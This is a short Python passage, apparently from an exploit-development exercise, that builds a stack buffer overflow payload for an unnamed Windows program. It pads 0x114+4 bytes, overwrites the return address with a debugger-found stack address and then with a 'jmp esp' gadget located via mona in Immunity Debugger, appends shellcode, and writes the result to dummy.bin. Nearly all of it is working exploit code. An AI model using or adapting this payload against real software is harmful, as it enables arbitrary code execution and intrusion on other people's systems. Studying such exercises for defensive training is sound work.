...
esp = 0x71fd74 # obtained by debugger
inconsistent_payload = b'A' * (0x114 + 4) + struct.pack('<I', esp + 0x114 + 4 + 4) + shellcode

# found a `jmp esp` by mona in Immunity Debugger: 0x4016cc
payload = b'A' * (0x114 + 4) + struct.pack('<I', 0x4016cc) + shellcode

open('dummy.bin', 'wb').write(payload)